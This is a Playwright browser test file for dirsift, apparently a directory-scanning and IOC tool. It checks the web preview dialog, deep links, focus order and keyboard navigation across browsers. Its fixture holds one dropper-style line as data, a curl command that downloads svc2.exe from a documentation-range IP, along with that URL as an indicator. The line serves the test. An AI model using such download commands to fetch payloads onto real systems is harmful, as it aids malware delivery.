"""End to end checks for the client behaviour the Python tests cannot see.

These drive a real browser, so they are not part of the normal test run: the
package stays air gapped and ships no browser engine or Node toolchain, and
`pyproject.toml` lists no browser dependency. Run this by hand when the sheet or
the preview swap logic in ``dirsift.js`` changes.

What it covers (the client side of the case file layout):
  * a ``?file=`` deep link opens the preview dialog and does not lock the page
  * navigating from inside the preview (same family, compare) moves focus to the
    new panel heading and keeps the address bar, the inventory selection and the
    reload in step
  * a 404 preview does not write a missing file into the address bar
  * the dialog at every width: j and k step through the files and the position
    follows, Tab stays inside, Esc and the scrim close it, focus goes back to
    the row, the back button closes it and forward re opens it
  * an old ``?tab=`` link lands on its part and the address is rewritten
  * the section menu marks the part on screen, and inventory rows fold
  * the skip link is the first stop and nothing covers it; it jumps below the
    sticky bar, and every focus stop on the run page is drawn uncovered
  * j does nothing until focus is in the inventory or the dialog
  * no page error and no console error in any of the above

How to run (Chromium, Firefox and WebKit; name one or more to run fewer):

    uv run --with playwright python tests/e2e/preview_nav_e2e.py
    uv run --with playwright python tests/e2e/preview_nav_e2e.py chromium
    uv run --with playwright playwright install chromium firefox webkit   # first time only

It starts its own server on 127.0.0.1:8811 against a throwaway run, so nothing
else needs to be up and no real target is touched. Exit code is 0 when every
check passes.
"""

from __future__ import annotations

import socket
import sys
import tempfile
import threading
import time
from pathlib import Path

import uvicorn

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from dirsift.models import Entry, Ioc, ScanResult  # noqa: E402
from dirsift.web import create_app  # noqa: E402

HOST = "127.0.0.1"
PORT = 8811
BASE = f"http://{HOST}:{PORT}"
ROOT = "http://127.0.0.1:8080/"
DRIVER = ROOT + "install.bat"
SVC2 = ROOT + "svc2.exe"
SVC3 = ROOT + "svc3.exe"
GONE = ROOT + "not-here.exe"


def build_run(runs_dir: Path) -> str:
    """One driver that names svc2, and two members of the svc family."""
    driver = Entry(
        url=DRIVER,
        name="install.bat",
        depth=1,
        kind="script",
        confidence="sniffed",
        fetched_bytes=120,
        size=120,
        sha256="c" * 64,
        md5="d" * 32,
        head_hex="4020656368",
        text_preview="curl -o svc2.exe http://203.0.113.24/bin/svc2.exe",
        references=["svc2.exe"],
    )
    dropped = Entry(
        url=SVC2,
        name="svc2.exe",
        depth=1,
        kind="pe",
        confidence="sniffed",
        fetched_bytes=4096,
        size=65536,
        truncated=True,
        head_hex="4d5a90000300",
        cluster="svc{n}.exe",
    )
    sibling = Entry(url=SVC3, name="svc3.exe", depth=1, kind="pe", cluster="svc{n}.exe")
    result = ScanResult(
        root_url=ROOT,
        listing_flavor="python",
        entries=[driver, dropped, sibling],
        iocs=[
            Ioc(
                ioc_type="url",
                value="http://203.0.113.24/bin/svc2.exe",
                defanged="hxxp://203[.]0[.]113[.]24/bin/svc2[.]exe",
                source_url=DRIVER,
            )
        ],
    )
    name = "fam"
    (runs_dir / f"{name}.json").write_text(result.model_dump_json(), encoding="utf-8")
    return name


def wait_for_port() -> None:
    for _ in range(100):
        with socket.socket() as probe:
            if probe.connect_ex((HOST, PORT)) == 0:
                return
        time.sleep(0.1)
    raise RuntimeError("server did not come up")


class Checks:
    def __init__(self) -> None:
        self.failures: list[str] = []
        self.passes = 0

    def ok(self, label: str, condition: bool) -> None:
        if condition:
            self.passes += 1
            print(f"  pass  {label}")
        else:
            self.failures.append(label)
            print(f"  FAIL  {label}")


BROWSERS = ("chromium", "firefox", "webkit")

COVERED = """(el) => {
  const r = el.getBoundingClientRect();
  if (r.width === 0 || r.height === 0) return 'empty';
  const x = Math.min(Math.max(r.left + r.width / 2, 0), innerWidth - 1);
  const y = Math.min(Math.max(r.top + Math.min(r.height / 2, 8), 0), innerHeight - 1);
  const hit = document.elementFromPoint(x, y);
  // A visually hidden checkbox is drawn by its own label, which carries the ring.
  const own = hit && (hit === el || el.contains(hit) || hit === el.closest('label'));
  return own ? 'clear' : 'covered by ' +
    (hit ? hit.tagName.toLowerCase() + '.' + hit.className : 'nothing');
}"""


def watch_errors(page, errors: list[str]) -> None:
    """Every uncaught exception and console error lands in one list. The one
    404 the checks ask for on purpose (a file the run does not have) is the
    browser reporting the status, not the page failing, so it is left out."""

    def console(msg) -> None:
        if msg.type == "error" and "status of 404" not in msg.text:
            errors.append(f"console: {msg.text}")

    page.on("pageerror", lambda exc: errors.append(f"pageerror: {exc}"))
    page.on("console", console)


def skip_link_checks(page, tag: str, checks: Checks) -> None:
    """The first Tab lands on the skip link, it is drawn above the sticky bar,
    and following it leaves the content below the bar."""
    page.goto(f"{BASE}/runs/fam")
    page.wait_for_selector("[data-listing-rows]")
    if tag.startswith("webkit"):
        # WebKit leaves links out of the Tab order unless the system says
        # otherwise (Option+Tab on a Mac), so the link is focused directly.
        page.focus(".skip-link")
    else:
        page.keyboard.press("Tab")
    page.wait_for_timeout(300)  # the link slides in over 120ms
    first = page.evaluate("() => document.activeElement.className")
    checks.ok(f"[{tag}] skip link: the first stop", first == "skip-link")
    state = page.eval_on_selector(".skip-link", COVERED)
    checks.ok(f"[{tag}] skip link: nothing covers it ({state})", state == "clear")

    page.evaluate("() => window.scrollTo(0, document.body.scrollHeight)")
    page.focus(".skip-link")
    page.keyboard.press("Enter")
    page.wait_for_timeout(300)
    gap = page.evaluate(
        "() => document.getElementById('main').getBoundingClientRect().top"
        " - document.querySelector('.app-top').getBoundingClientRect().bottom"
    )
    checks.ok(f"[{tag}] skip link: the content starts below the bar ({gap:.0f})", gap >= -1)


def focus_stop_checks(page, tag: str, checks: Checks) -> None:
    """Tab through the run page: every stop is drawn where it can be seen."""
    page.goto(f"{BASE}/runs/fam")
    page.wait_for_selector("[data-listing-rows]")
    covered = []
    seen = 0
    for _ in range(80):
        page.keyboard.press("Tab")
        page.wait_for_timeout(150)  # let the skip link slide in and scrolling settle
        state = page.evaluate(
            "(f) => { const el = document.activeElement;"
            " if (!el || el === document.body) return 'body';"
            " const covered = (new Function('return ' + f))();"
            " return (el.id || el.className || el.tagName) + ' ' + covered(el); }",
            COVERED,
        )
        if state == "body":
            break
        seen += 1
        if not state.endswith(" clear"):
            covered.append(state)
    checks.ok(f"[{tag}] focus: {seen} stops, none covered {covered[:3]}", seen > 10 and not covered)


def key_scope_checks(page, tag: str, checks: Checks) -> None:
    """j is the inventory's key: pressed with focus elsewhere it does nothing."""
    page.goto(f"{BASE}/runs/fam")
    page.wait_for_selector("[data-listing-rows]")
    page.focus(".brand")
    page.keyboard.press("j")
    page.wait_for_timeout(200)
    opened = page.evaluate(
        "() => document.querySelector('#preview-sheet').classList.contains('is-open')"
    )
    quiet = not opened and file_param(page) is None
    checks.ok(f"[{tag}] keys: j outside the inventory opens nothing", quiet)
    hint = page.is_visible("#files .keys")
    checks.ok(f"[{tag}] keys: the inventory names its keys", hint)


def file_param(page) -> str | None:
    from urllib.parse import parse_qs, urlparse

    return (parse_qs(urlparse(page.url).query).get("file") or [None])[0]


def tap(page, selector: str) -> None:
    """Click through the DOM so an overlapping fixed sheet cannot swallow the
    pointer. htmx and the page handlers react the same to a dispatched click."""
    page.eval_on_selector(selector, "el => el.click()")


def active_heading(page) -> str:
    return page.evaluate(
        "() => (document.activeElement && document.activeElement.textContent || '').trim()"
    )


def run_checks(page, narrow: bool, checks: Checks) -> None:
    tag = "narrow" if narrow else "wide"

    # Open svc2, move to the Links tab, step to svc3 via Same family.
    page.goto(f"{BASE}/runs/fam?file={SVC2}")
    page.wait_for_selector("#panel-links, .tab")
    tap(page, "#tab-links")
    tap(page, "#preview .link-button[data-file-url='" + SVC3 + "']")
    page.wait_for_function(
        "(u) => new URL(location.href).searchParams.get('file') === u", arg=SVC3
    )
    checks.ok(f"[{tag}] same family: ?file= follows to svc3", file_param(page) == SVC3)
    selected = page.eval_on_selector_all(
        "[data-listing-rows] [data-row].is-selected .link-button",
        "els => els.map(e => e.getAttribute('data-file-url'))",
    )
    checks.ok(f"[{tag}] same family: svc3 row is selected", selected == [SVC3])
    stays = page.is_visible("#preview-sheet.is-open")
    checks.ok(f"[{tag}] same family: no page load, the dialog stays", stays)
    checks.ok(f"[{tag}] same family: focus on the new heading", active_heading(page) == "svc3.exe")

    # Reload opens the file the address bar now names.
    page.reload()
    name = page.eval_on_selector("#preview .preview-name", "el => el.textContent.trim()")
    checks.ok(f"[{tag}] reload opens svc3", name == "svc3.exe")

    # Compare keeps ?file= on the opened file but still moves focus to the heading.
    page.goto(f"{BASE}/runs/fam?file={SVC2}")
    page.wait_for_selector(".tab")
    tap(page, "#tab-links")
    tap(page, "button.copy[hx-get*='/diff']")
    # The old heading is still there until the swap lands: wait for the new one.
    page.wait_for_function(
        "() => (document.querySelector('#preview .preview-name') || {}).textContent"
        " ?.includes('against')"
    )
    heading = page.eval_on_selector("#preview .preview-name", "el => el.textContent.trim()")
    checks.ok(f"[{tag}] compare: diff heading is shown", "against" in heading)
    checks.ok(f"[{tag}] compare: focus on the diff heading", "against" in active_heading(page))
    checks.ok(f"[{tag}] compare: ?file= stays on svc2", file_param(page) == SVC2)

    # A 404 preview must not write the missing file into the address bar.
    page.goto(f"{BASE}/runs/fam")
    page.wait_for_selector("[data-listing-rows] .link-button")
    page.eval_on_selector(
        "[data-listing-rows] .link-button",
        "(el, u) => el.setAttribute('hx-get', '/runs/fam/file?url=' + encodeURIComponent(u))",
        arg=GONE,
    )
    tap(page, "[data-listing-rows] .link-button")
    page.wait_for_selector("#preview .preview-name")
    miss = page.eval_on_selector("#preview .preview-name", "el => el.textContent.trim()")
    checks.ok(f"[{tag}] 404: the miss panel is shown", miss == "Not in this run")
    checks.ok(f"[{tag}] 404: no missing ?file= in the address bar", file_param(page) != GONE)


CLOSED = "() => !document.querySelector('#preview-sheet').classList.contains('is-open')"
INSIDE = "() => document.querySelector('#preview-sheet').contains(document.activeElement)"


def wait_file(page, url: str) -> None:
    page.wait_for_function(
        "(u) => new URL(location.href).searchParams.get('file') === u", arg=url
    )


def position(page) -> str:
    return (page.text_content("[data-sheet-pos]") or "").strip()


def dialog_checks(page, tag: str, checks: Checks) -> None:
    """The preview is a dialog at every width: open, step, trap, close."""
    page.goto(f"{BASE}/runs/fam")
    page.wait_for_selector("[data-listing-rows] [data-row] .link-button")
    first = "[data-listing-rows] [data-row] .link-button[data-file-url='" + SVC2 + "']"
    page.focus(first)
    page.keyboard.press("Enter")
    page.wait_for_selector("#preview-sheet.is-open")
    checks.ok(f"[{tag}] dialog: a file opens it", page.is_visible("#preview-sheet.is-open"))
    role = page.eval_on_selector(
        "#preview-sheet", "el => el.getAttribute('role') + ' ' + el.getAttribute('aria-modal')"
    )
    checks.ok(f"[{tag}] dialog: role dialog, aria-modal", role == "dialog true")
    checks.ok(f"[{tag}] dialog: focus on the file heading", active_heading(page) == "svc2.exe")
    # The inventory is grouped by kind: the PE group (svc2, svc3) comes before
    # the scripts (install.bat), and prev and next follow that order.
    checks.ok(f"[{tag}] dialog: position reads 1 / 3", position(page) == "1 / 3")
    prev_off = page.eval_on_selector("[data-sheet-step='-1']", "el => el.disabled")
    checks.ok(f"[{tag}] dialog: previous is off on the first file", prev_off)
    page.keyboard.press("j")
    wait_file(page, SVC3)
    checks.ok(f"[{tag}] dialog: j steps to the next file", position(page) == "2 / 3")
    page.keyboard.press("j")
    wait_file(page, DRIVER)
    checks.ok(f"[{tag}] dialog: j crosses into the next group", position(page) == "3 / 3")
    next_off = page.eval_on_selector("[data-sheet-step='1']", "el => el.disabled")
    checks.ok(f"[{tag}] dialog: next is off on the last file", next_off)
    page.keyboard.press("k")
    wait_file(page, SVC3)
    checks.ok(f"[{tag}] dialog: k steps back", position(page) == "2 / 3")
    tap(page, "[data-sheet-step='1']")
    wait_file(page, DRIVER)
    checks.ok(f"[{tag}] dialog: the next button steps too", position(page) == "3 / 3")

    # Tab never leaves the dialog.
    inside = True
    for _ in range(25):
        page.keyboard.press("Tab")
        inside = inside and page.evaluate(INSIDE)
    checks.ok(f"[{tag}] dialog: Tab stays inside", inside)
    page.keyboard.press("Shift+Tab")
    checks.ok(
        f"[{tag}] dialog: Shift+Tab stays inside",
        page.evaluate(INSIDE),
    )

    # Esc closes and focus returns to the row of the file now shown.
    page.keyboard.press("Escape")
    page.wait_for_function(CLOSED)
    back = page.evaluate("() => document.activeElement.getAttribute('data-file-url')")
    checks.ok(f"[{tag}] dialog: Esc closes, focus back on the row", back == DRIVER)
    checks.ok(f"[{tag}] dialog: Esc drops ?file=", file_param(page) is None)
    unlocked = page.evaluate("() => !document.documentElement.classList.contains('sheet-open')")
    checks.ok(f"[{tag}] dialog: the page is unlocked after close", unlocked)

    # The scrim closes it too (desktop only: on a phone the dialog covers it).
    if tag == "wide":
        tap(page, first)
        page.wait_for_selector("#preview-sheet.is-open")
        page.mouse.click(5, 300)
        page.wait_for_function(CLOSED)
        checks.ok("[wide] dialog: a click outside closes it", True)

    # Back closes, forward re opens.
    tap(page, first)
    page.wait_for_selector("#preview-sheet.is-open")
    page.go_back()
    page.wait_for_function(CLOSED)
    checks.ok(f"[{tag}] dialog: back closes it", file_param(page) is None)
    page.go_forward()
    page.wait_for_selector("#preview-sheet.is-open")
    checks.ok(f"[{tag}] dialog: forward re-opens it", file_param(page) == SVC2)

    # A deep link opens the dialog, and nothing behind it is reachable.
    page.goto(f"{BASE}/runs/fam?file={SVC2}")
    page.wait_for_selector("#preview-sheet.is-open")
    checks.ok(f"[{tag}] deep link: opens the dialog", page.is_visible("#preview-sheet.is-open"))
    inert = page.evaluate("() => document.querySelector('.case-file').closest('[inert]') !== null")
    checks.ok(f"[{tag}] deep link: the case file behind is inert", inert)


def case_file_checks(page, checks: Checks) -> None:
    """Old tab links, the section menu, folded rows."""
    page.goto(f"{BASE}/runs/fam?tab=notes")
    page.wait_for_function("() => location.hash === '#notes'")
    checks.ok("[wide] ?tab=notes: the address becomes #notes", "tab=" not in page.url)
    page.wait_for_timeout(300)
    top = page.evaluate("() => document.getElementById('notes').getBoundingClientRect().top")
    checks.ok(f"[wide] ?tab=notes: the notes are on screen ({top:.0f})", 0 <= top < 900)

    page.goto(f"{BASE}/runs/fam")
    page.click("[data-spy-link][href='#indicators']")
    page.wait_for_timeout(900)
    lit = page.eval_on_selector("[aria-current='location']", "el => el.getAttribute('href')")
    checks.ok("[wide] section menu: the clicked part is lit", lit == "#indicators")
    # Firefox caps how far one wheel event moves the page, so wheel until the top.
    for _ in range(10):
        page.mouse.wheel(0, -5000)
        page.wait_for_timeout(300)
        if page.evaluate("() => window.scrollY") == 0:
            break
    page.wait_for_timeout(300)
    lit = page.eval_on_selector("[aria-current='location']", "el => el.getAttribute('href')")
    checks.ok("[wide] section menu: back at the top, Identity is lit", lit == "#identity")

    toggle = "[data-row] .row-toggle"
    body = "[data-row] .inv-body"
    hidden = page.eval_on_selector(body, "el => getComputedStyle(el).display === 'none'")
    checks.ok("[wide] inventory: row details start folded", hidden)
    tap(page, toggle)
    shown = page.eval_on_selector(body, "el => getComputedStyle(el).display !== 'none'")
    expanded = page.eval_on_selector(toggle, "el => el.getAttribute('aria-expanded')")
    checks.ok("[wide] inventory: the toggle opens a row", shown and expanded == "true")


def narrow_only(page, checks: Checks) -> None:
    # QA-01: a ?tab=notes&file= deep link must not lock the page.
    page.goto(f"{BASE}/runs/fam?tab=notes&file={SVC2}")
    page.wait_for_selector("#preview-sheet.is-open")
    opened = page.is_visible("#preview-sheet.is-open")
    checks.ok("[narrow] deep link with ?tab= opens the dialog", opened)
    full = page.eval_on_selector(
        "#preview-sheet", "el => el.getBoundingClientRect().width === window.innerWidth"
    )
    checks.ok("[narrow] the dialog takes the whole width", full)
    locked = page.evaluate("() => document.documentElement.classList.contains('sheet-open')")
    checks.ok("[narrow] sheet-open lock is set only with the sheet up", locked)
    tap(page, "#tab-links")
    checks.ok("[narrow] deep link page stays interactive", True)
    page.keyboard.press("Escape")
    page.wait_for_function("() => !document.documentElement.classList.contains('sheet-open')")
    checks.ok("[narrow] Esc unlocks the page", True)


def run_browser(pw, engine: str, checks: Checks) -> None:
    browser = getattr(pw, engine).launch()
    errors: list[str] = []

    wide = browser.new_context(viewport={"width": 1440, "height": 900})
    page = wide.new_page()
    watch_errors(page, errors)
    print(f"{engine} wide (1440x900):")
    run_checks(page, narrow=False, checks=checks)
    dialog_checks(page, "wide", checks)
    case_file_checks(page, checks)
    skip_link_checks(page, f"{engine} 1440", checks)
    focus_stop_checks(page, f"{engine} 1440", checks)
    key_scope_checks(page, f"{engine} 1440", checks)
    wide.close()

    small = browser.new_context(viewport={"width": 390, "height": 800})
    page = small.new_page()
    watch_errors(page, errors)
    print(f"{engine} narrow (390x800):")
    run_checks(page, narrow=True, checks=checks)
    dialog_checks(page, "narrow", checks)
    narrow_only(page, checks)
    page.set_viewport_size({"width": 414, "height": 800})
    skip_link_checks(page, f"{engine} 414", checks)
    focus_stop_checks(page, f"{engine} 414", checks)
    small.close()
    browser.close()

    # The deep link from the address bar used to throw (trigger.closest).
    checks.ok(f"[{engine}] no page or console error {errors[:3]}", errors == [])


def main() -> int:
    engines = [name for name in sys.argv[1:] if name in BROWSERS] or list(BROWSERS)
    tmp = Path(tempfile.mkdtemp(prefix="dirsift-e2e-"))
    build_run(tmp)
    app = create_app(tmp)
    config = uvicorn.Config(app, host=HOST, port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    wait_for_port()

    checks = Checks()
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("playwright is not installed. See the header of this file for how to run it.")
        return 2

    with sync_playwright() as pw:
        for engine in engines:
            run_browser(pw, engine, checks)

    server.should_exit = True
    print(f"\n{checks.passes} passed, {len(checks.failures)} failed")
    for label in checks.failures:
        print(f"  FAIL  {label}")
    return 1 if checks.failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
